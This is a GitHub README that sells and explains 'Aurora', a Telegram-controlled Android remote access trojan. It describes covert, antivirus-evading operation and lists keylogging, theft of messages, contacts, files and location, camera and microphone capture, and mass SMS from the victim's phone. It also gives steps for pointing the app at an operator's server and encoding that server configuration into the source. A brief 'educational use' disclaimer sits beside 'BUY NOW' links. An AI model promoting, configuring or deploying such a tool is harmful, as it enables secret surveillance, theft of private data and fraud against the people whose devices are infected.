<div align="center">
  <img src="https://github.com/griffin-k/AURORA-EYE/blob/837212905734b395adf6330bea19851e9456c9a2/about-Images/1.png" alt="Logo">
</div>


<p align="center">
  A multifunctional Telegram based Android RAT without port forwarding
</p>

## ABOUT
Aurora is a Telegram-based Android RAT (Remote Access Trojan) is a covert application that discreetly runs on Android devices. It operates silently and automatically sends device data whenever the device connects to the internet. Additionally, it listens for commands from an attacker via a Telegram bot and sends requested data back to the attacker. This RAT is designed to remain fully hidden, supporting the latest Android versions, and is intended to operate undetectably on the target device.



## Features
- Real time
- Notification Reader
- Notification Sender (send custom notification that apper on target device with custom click link)
- Show toast message on target device (Toasts are messages that appear in a box at the bottom of the device)
- Receive information about simcard provider
- Vibrate target device
- Receive device location
- Receive all target message
- Send sms with target device to any number
- Send sms with target device to all of his/her contacts
- Recive all target contacts
- Receive list of all installedd apps in target device
- Receive any file or folder from target device
- Delete any file or folder from target device
- Capture main and front camera
- Capture microphone (with custom duration)
- Receive last clipboard text
- Auto start after device boot
- Keylogger 
- Beautiful telegram bot interface
- Undetectable by antivirus
- Hidden App Auto get Permissions

  <p align="center">
  <a href="https://t.me/shivaya_dav">
    <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
  </a>
  <a href="https://t.me/shivaya_dav">
    <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
  </a>
  <a href="https://t.me/shivaya_dav">
    <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
  </a>
  </p>


<h2>Requirements</h2>
<ul>
  <li><span style="color: #0074D9;">APK EDITOR</span></li>
  <li><span style="color: #2ECC40;">Android Studio</span></li>
  <li>For hosting server code, you can use some free services like:</li>
  <ul>
    <li><a href="https://replit.com/" style="color: #FF4136;">replit.com</a></li>
    <li><a href="https://glitch.com/" style="color: #FFDC00;">glitch.com</a></li>
    <li><a href="https://heroku.com/" style="color: #B10DC9;">heroku.com</a></li>
  </ul>

</p>
  <li>Keep in mind that these sites can suspend your projects, so it's better to host on your own computer.</li>
  
</ul>


<h2 align="center">Download</h2>

<p align="center">
  <a href="https://cybershieldx.com/termux.apk">
    <img src="https://img.shields.io/badge/Termux%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download Android Studio" />
  </a>
  <a href="https://cybershieldx.com/editor.apk">
    <img src="https://img.shields.io/badge/APK%20Editor%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download APK Editor" />
  </a>
</p>


## Edit apk
 - Open Apk editor 
 - select apk
 - choose full edit
 - select decode all files
 - go to assets folder
 - open host.json
 - and enter url
 - in socket replace url https to wss 
 - build apk ,start the bott  Enjoy

## example
```bash  
  { 
  "host": "https://yoururl.com/", 
  "socket": "wss://yoururl.com/", 
  "webView": "https://google.com/" 
}
```

## How to Build in Android Studio

To build the application in Android Studio, follow these steps:

1. Open the Android Studio and import the application source code.
2. Navigate to the following path in the source code: `Utils/AppTools.kt`.
3. In the `AppTools.kt` file, locate the `data` variable and copy your server information into it.
4. However, before copying the server information directly into the variable, you must encode it using Base64.
5. Here is an example JSON structure for your server information:
```
{
"host" : "",
"socket" : "",
"webView" : "https://www.google.com"
}
```

6. Fill in the above JSON structure with your server information.
7. Go to https://www.base64encode.org/ and copy the encoded result of your JSON data.
8. In Android Studio, paste the encoded result into the `data` variable.
9. The final code should look like this:

```kotlin
fun getAppData(): AppData {
    val data = "<your encoded server info>"
    val text = decode(data)
    return json().fromJson(text, AppData::class.java)
}
```


<p align="center">
  <img src="https://img.shields.io/badge/Disclaimer-Important-red" alt="Important Disclaimer"/>
</p>

<p align="center">
  <b><i>Note:</b> The developer provides no warranty with this software and will not be responsible for any direct or indirect damage caused by the usage of this tool. AURORA-EYE is built for educational and internal use only.
</p>

<p align="center">
  <b>Attention:</i></b> We do not endorse any illegal or unethical use of this tool. The user assumes all responsibility for the use of this software.
</p>



<p align="center">
  <b>Thank you for using Aurora - we hope it serves its intended purpose and helps you achieve your goals!</b>
</p>




h2 align="center">🔗 Contact and Social Media Accounts</h2>

<p align="center">
  <a href="https://t.me/CyberShieldX">
    <img src="https://img.shields.io/badge/CONTACT-TELEGRAM-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
  </a>
  <a href="https://instagram.com/CyberShieldX">
    <img src="https://img.shields.io/badge/CONTACT-INSTAGRAM-red?style=for-the-badge&logo=instagram" alt="Instagram Badge"/>
  </a>
  <a href="https://twitter.com/CyberShieldX">
    <img src="https://img.shields.io/badge/CONTACT-TWITTER-blue?style=for-the-badge&logo=twitter" alt="Twitter Badge"/>
  </a>
  <a href="https://www.youtube.com/@sphanter/about">
    <img src="https://img.shields.io/badge/CONTACT-YOUTUBE-red?style=for-the-badge&logo=youtube" alt="Youtube Badge"/>
  </a>
</p>







